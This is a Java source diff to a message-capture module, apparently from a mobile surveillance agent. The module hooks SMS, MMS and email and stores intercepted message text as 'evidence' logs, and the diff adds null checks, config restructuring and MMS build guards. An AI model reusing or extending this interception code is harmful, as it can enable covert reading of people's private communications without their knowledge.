@@ -86,6 +86,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     private Date mailTo;
 
     public static String getStaticType() {
+        //18.0=messages
         return Messages.getString("18.0"); //$NON-NLS-1$
     }
 
@@ -127,14 +128,18 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             mailEnabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
             ChildConf mailFilter = mailJson
                     .getChild(Messages.getString("18.3")); //$NON-NLS-1$
-            mailHistory = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
-            mailFrom = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
-            mailTo = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
+            if (mailEnabled) {
+                int maxSizeToLog = 4096;
+                mailHistory = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
+                if (mailHistory) {
+                    mailFrom = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
+                    mailTo = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
+                    filterEmailCollect = new Filter(mailHistory, mailFrom,
+                            mailTo, maxSizeToLog, maxSizeToLog);
+                }
 
-            int maxSizeToLog = 4096;
-            filterEmailCollect = new Filter(mailHistory, mailFrom, mailTo,
-                    maxSizeToLog, maxSizeToLog);
-            filterEmailRuntime = new Filter(mailEnabled, maxSizeToLog);
+                filterEmailRuntime = new Filter(mailEnabled, maxSizeToLog);
+            }
 
             ChildConf smsJson = conf.getChild(Messages.getString("18.7")); //$NON-NLS-1$
             smsEnabled = smsJson.getBoolean(Messages.getString("18.8")); //$NON-NLS-1$
@@ -163,7 +168,10 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         if (mmsEnabled) {
+            // TODO: MMS
+            //#ifdef MMS
             mmsListener.start(this);
+            //#endif
         }
 
         if (mailEnabled) {
@@ -236,7 +244,9 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         if (mmsEnabled && mmsListener != null) {
+            //#ifdef MMS
             mmsListener.stop();
+            //#endif
         }
 
         if (mailEnabled && mailListener != null) {
@@ -338,6 +348,10 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     public boolean onNewSms(final byte[] byteMessage, String address,
             final boolean incoming) {
 
+        if (byteMessage == null) {
+            return false;
+        }
+
         String message = new String(byteMessage);
         //#ifdef DBC
         Check.requires(message != null, "saveLog: null message"); //$NON-NLS-1$
@@ -419,23 +433,17 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             //#endif
 
             // Creating log
-            if (message != null) {
-                createEvidence(additionalData, WChar.getBytes(message),
-                        EvidenceType.SMS_NEW);
-                return false;
-            } else {
-                //#ifdef DEBUG
-                debug.error("data null"); //$NON-NLS-1$
-                //#endif
-                return false;
-            }
+
+            createEvidence(additionalData, WChar.getBytes(message),
+                    EvidenceType.SMS_NEW);
 
         } catch (final Exception ex) {
             //#ifdef DEBUG
             debug.error("saveLog message: " + ex); //$NON-NLS-1$
             //#endif
-            return false;
+
         }
+        return false;
     }
 
     public void onNewMms(final byte[] byteMessage, String address,
